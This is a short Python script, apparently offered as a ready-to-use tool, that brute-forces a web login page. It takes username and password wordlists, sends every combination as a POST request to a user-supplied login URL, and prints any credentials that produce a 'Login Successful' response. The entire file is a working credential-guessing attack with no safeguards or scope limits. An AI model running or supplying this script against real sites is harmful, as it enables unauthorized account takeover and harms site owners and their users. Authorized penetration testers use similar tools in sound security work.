import requests

# Prompt the user for input
username_wordlist = input("Please provide the name or path to the username wordlist file: ")
password_wordlist = input("Please provide the name or path to the password wordlist file: ")
user_url = input("Please provide the URL of the login page: ")

# Initialize variables with user inputs
users = username_wordlist
passwords = password_wordlist
url = user_url

# Read the username wordlist file
with open(users, 'r', encoding='latin-1') as users_file:
    user_list = [line.rstrip() for line in users_file]

# Read the password wordlist file
with open(passwords, 'r', encoding='latin-1') as passwords_file:
    password_list = [line.rstrip() for line in passwords_file]

# Iterate through usernames and passwords
for username in user_list:
    for password in password_list:
        # Prepare the payload for the login request
        payload = {'user_login': username, 'user_password': password}
        
        # Send a POST request to the login URL
        response = requests.post(url, data=payload)
        
        # Check if the response contains a specific success message (adjust this condition for your web app)
        if "Login Successful".encode() in response.content:  # Change this condition based on your web app's success message
            print(f"Valid Username: {username} and Password: {password}")
            break
        else:
            print(f"[X] Trying Username: {username} Password: {password}")
